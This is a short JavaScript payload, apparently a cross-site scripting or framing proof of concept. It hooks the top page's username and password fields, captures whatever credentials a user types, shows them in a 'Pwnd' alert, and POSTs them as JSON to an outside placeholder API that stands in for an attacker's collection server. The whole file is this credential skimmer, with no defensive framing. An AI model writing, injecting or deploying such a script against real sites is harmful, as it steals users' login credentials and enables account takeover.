// top.console.log('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');
var usr; var pw;
top.document.addEventListener('change', e => {
  if (event.target.matches('#username')) {
    usr = e.target.value;
  } else if (e.target.matches('#password')) {
    pw = e.target.value

    if (usr.length && pw.length) {
      pw = top.password.value;
      alert('Pwnd: ' + usr + ' ' + pw);
      fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST',
        headers: {'Accept': 'application/json', 'Content-Type': 'application/json' },
        body: JSON.stringify({u: usr, p: pw})
      })
    }
  }
}, false)